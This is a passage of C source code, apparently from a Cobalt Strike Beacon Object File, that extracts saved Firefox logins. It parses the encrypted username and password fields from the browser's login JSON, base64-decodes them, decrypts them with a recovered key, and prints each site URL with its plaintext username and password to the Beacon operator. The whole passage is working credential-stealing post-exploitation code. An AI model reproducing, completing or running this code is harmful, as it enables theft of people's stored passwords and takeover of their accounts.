			hep = MSVCRT$strstr(p, "\"encryptedPassword\"");
			if (hu) {
				hu = MSVCRT$strchr(hu, ':');
				if (hu) {
					hu++;
					while (*hu == ' ' || *hu == '\"')
						hu++;
					hp = host;
					while (*hu && *hu != '\"' && (size_t)(hp - host) < sizeof(host) - 1)
						*hp++ = *hu++;
					*hp = 0;
				}
			}
			if (heu) {
				heu = MSVCRT$strchr(heu, ':');
				if (heu) {
					heu++;
					while (*heu == ' ' || *heu == '\"')
						heu++;
					if (ff_b64_to_bin(heu, ub, sizeof(ub), &ul) == 0)
						ff_do_login_blob(priv24, ub, (int)ul, user, sizeof(user));
				}
			}
			if (hep) {
				hep = MSVCRT$strchr(hep, ':');
				if (hep) {
					hep++;
					while (*hep == ' ' || *hep == '\"')
						hep++;
					if (ff_b64_to_bin(hep, pb, sizeof(pb), &pl) == 0)
						ff_do_login_blob(priv24, pb, (int)pl, pass, sizeof(pass));
				}
			}
			if (host[0] && (user[0] || pass[0]))
				BeaconFormatPrintf(fmt, "\t[URL] -> {%s}\n\t[USERNAME] -> {%s}\n\t[PASSWORD] -> {%s}\n\n", host, user, pass);
			p = q + 1;
			if (!MSVCRT$strchr(p, '{'))
				break;
		}
		plg_free(js);
	}
}
